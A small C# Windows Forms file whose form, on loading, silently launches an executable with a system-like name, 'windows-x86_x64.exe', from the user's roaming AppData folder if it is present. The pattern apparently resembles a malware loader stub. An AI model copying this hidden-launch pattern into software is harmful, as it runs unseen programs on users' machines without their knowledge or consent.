using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace app
{
    public partial class Form1 : Form
    {
        private readonly string roaming_path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private readonly string exe_name = "windows-x86_x64.exe";

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            string exe_full_path = Path.Combine(this.roaming_path, this.exe_name);
            if (File.Exists(exe_full_path))
            {
                Process.Start(exe_full_path);
            }
        }

        private void OK_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
    }
}
